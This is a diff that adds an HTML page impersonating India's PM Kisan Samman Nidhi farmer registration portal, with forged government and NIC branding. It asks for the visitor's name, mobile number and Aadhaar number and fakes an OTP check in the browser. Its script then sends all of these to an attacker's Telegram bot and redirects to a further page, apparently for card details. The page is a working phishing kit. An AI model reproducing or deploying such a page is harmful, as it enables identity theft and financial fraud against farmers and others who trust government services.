@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Farmer Registration</title>
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Form Container */
+        .form-container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .form-container input, .form-container button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .form-container button {
+            background-color: #1565c0;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container button:hover {
+            background-color: #0044cc;
+        }
+
+        .otp-display {
+            display: none;
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .info-text {
+            font-size: 0.9rem;
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .error-message {
+            color: red;
+            font-weight: bold;
+            display: none;
+        }
+
+        .success-message {
+            color: green;
+            font-weight: bold;
+            display: none;
+        }
+
+        .timer {
+            font-weight: bold;
+            color: #1565c0;
+        }
+
+        /* Animation for redirection */
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        .redirect-animation {
+            animation: fadeOut 1s ease-in-out;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: black;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .form-container {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="form-container">
+            <h3>New Farmer Registration</h3>
+            <form id="farmerForm">
+                <label for="name">Enter Your Name:</label>
+                <input type="text" id="name" name="name" placeholder="Enter Your Name" required>
+
+                <label for="mobile">Enter Mobile Number (10 digits):</label>
+                <input type="text" id="mobile" name="mobile" placeholder="Enter Mobile Number" maxlength="10" required>
+
+                <label for="aadhar">Enter Aadhaar Card Number:</label>
+                <input type="text" id="aadhar" name="aadhar" placeholder="Enter Aadhaar Number (e.g., 4563 7652 2343)" required>
+
+                <p class="info-text">
+                    Enter Your Aadhaar Number. Your Aadhaar will be authenticated with UIDAI. You will be able to proceed for registration only if your Aadhaar is authenticated.
+                </p>
+
+                <button type="button" onclick="generateOTP()">Get OTP</button>
+                <div id="otpDisplay" class="otp-display"></div>
+                <div id="timer" class="timer"></div>
+
+                <label for="otpInput">Enter OTP (4 digits):</label>
+                <input type="text" id="otpInput" name="otpInput" placeholder="Enter OTP" maxlength="4" required>
+                <div id="errorMessage" class="error-message">Incorrect OTP. Please try again.</div>
+                <div id="successMessage" class="success-message">Verified Successfully! ✅</div>
+
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let generatedOTP = "";
+        let otpAttempts = 0;
+        let timerInterval;
+
+        // Function to format Aadhaar number
+        function formatAadhar() {
+            const aadharInput = document.getElementById('aadhar');
+            let value = aadharInput.value.replace(/\D/g, ''); // Remove non-numeric characters
+            if (value.length > 12) value = value.substring(0, 12); // Limit to 12 digits
+            value = value.replace(/(\d{4})(\d{4})(\d{4})/, '$1 $2 $3'); // Format as XXXX XXXX XXXX
+            aadharInput.value = value;
+        }
+
+        // Function to generate OTP
+        function generateOTP() {
+            generatedOTP = Math.floor(1000 + Math.random() * 9000); // 4-digit OTP
+            document.getElementById('otpDisplay').innerText = `Your OTP is: ${generatedOTP}`;
+            document.getElementById('otpDisplay').style.display = "block";
+
+            // Start the timer
+            let timeLeft = 15;
+            document.getElementById('timer').innerText = `Time left: ${timeLeft} seconds`;
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = `Time left: ${timeLeft} seconds`;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('otpDisplay').style.display = "none";
+                    document.getElementById('timer').innerText = "";
+                }
+            }, 1000);
+        }
+
+        // Function to send data to Telegram
+        function sendToTelegram(name, mobile, aadhar, otp) {
+            const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const message = `New Registration:\nName: ${name}\nMobile: ${mobile}\nAadhaar: ${aadhar}\nOTP: ${otp}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Data sent to Telegram:', data))
+                .catch(error => console.error('Error sending data to Telegram:', error));
+        }
+
+        // Form submission handler
+        document.getElementById('farmerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const enteredOTP = document.getElementById('otpInput').value;
+
+            if (enteredOTP === generatedOTP.toString()) {
+                // Show success message
+                document.getElementById('successMessage').style.display = "block";
+                document.getElementById('errorMessage').style.display = "none";
+
+                // Send data to Telegram
+                const name = document.getElementById('name').value;
+                const mobile = document.getElementById('mobile').value;
+                const aadhar = document.getElementById('aadhar').value;
+                sendToTelegram(name, mobile, aadhar, enteredOTP);
+
+                // Redirect to ccnew.html with animation
+                setTimeout(() => {
+                    document.body.classList.add('redirect-animation');
+                    setTimeout(() => {
+                        window.location.href = "ccnew.html";
+                    }, 1000);
+                }, 2000);
+            } else {
+                otpAttempts++;
+                if (otpAttempts >= 3) {
+                    alert("You have exceeded the maximum OTP attempts. Please try again later.");
+                    window.location.reload();
+                } else {
+                    document.getElementById('errorMessage').style.display = "block";
+                }
+            }
+        });
+
+        // Attach Aadhaar formatting function to input
+        document.getElementById('aadhar').addEventListener('input', formatAadhar);
+    </script>
+</body>
+</html>
